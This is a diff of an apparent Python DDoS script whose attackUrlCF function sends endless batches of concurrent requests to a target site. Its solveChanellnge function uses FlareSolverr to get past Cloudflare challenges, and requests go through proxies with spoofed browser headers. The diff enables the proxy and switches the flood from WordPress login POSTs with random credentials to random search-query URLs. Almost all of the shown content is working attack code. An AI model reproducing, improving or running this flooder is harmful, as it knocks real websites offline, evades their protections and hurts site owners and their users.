@@ -71,7 +71,7 @@ def solveChanellnge(url):
 			data = {"cmd": "request.get",
 					"url": url,
 					"returnOnlyCookies": True,
-					# 'proxy': {'url': PROXY_URL}  ,
+					'proxy': {'url': PROXY_URL}  ,
 					"maxTimeout": 30000,
 					}
 			resStr = requests.post(flareSolverUrl, json=data).content
@@ -104,9 +104,9 @@ def attackUrlCF(baseUrl, threadNum):
 
 	while True:
 		try:
-			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
 			# url = baseUrl +'/' + ''.join(random.choice(letters) for i in range(30)) 
-			url = baseUrl + '/wp-login.php'
+			#url = baseUrl + '/wp-login.php'
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -115,14 +115,14 @@ def attackUrlCF(baseUrl, threadNum):
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
-			data= {'log':''.join(random.choice(letters) for i in range(10)),'pwd':"asdasd", 'redirect_to':"",'wp-submit':"Log+In", 'testcookie':"1"}
+			# data= {'log':''.join(random.choice(letters) for i in range(10)),'pwd':"asdasd", 'redirect_to':"",'wp-submit':"Log+In", 'testcookie':"1"}
 			#data = {'user_login': ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",'redirect_to':"",'wp-submit':"Get+New+Password"}
 			# print(proxies, cookiesStr)
 			# print(requests.get('https://api.ipify.org', proxies=proxies).content)
 
 			requestsArr = []
 			for x in range(10):
-				requestsArr.append(grequests.post(url, headers=headers, cookies=cookiesStr, timeout=30, data=data))
+				requestsArr.append(grequests.post(url, headers=headers, cookies=cookiesStr, timeout=30, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(threadNum, baseUrl , res)
